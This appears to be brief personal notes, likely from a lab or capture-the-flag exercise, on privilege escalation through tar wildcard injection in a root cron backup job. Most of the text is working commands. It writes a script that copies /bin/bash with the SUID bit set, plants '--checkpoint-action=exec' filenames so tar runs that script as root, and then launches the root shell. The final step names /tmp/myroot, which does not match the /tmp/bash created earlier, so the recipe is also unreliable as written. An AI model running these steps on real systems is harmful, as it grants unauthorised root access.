# Wildcard escalation

---

- Create a shell.sh file that would create a copy of /bin/bash and set its SUID bit. So, as the job is being run by root a copy of root's bash would be created.
  ```bash
  echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > /home/andre/backup/shell.sh
  ```
  - Make the ***shell.sh*** executable
 
 -Create checkpoint files 
  ```bash
touch /home/andre/backup/--checkpoint=1
#and
touch /home/andre/backup/--checkpoint-action=exec=sh\ shell.sh
  ```
  
- Execute the file - `/tmp/myroot -p`
> ***-p is very imp***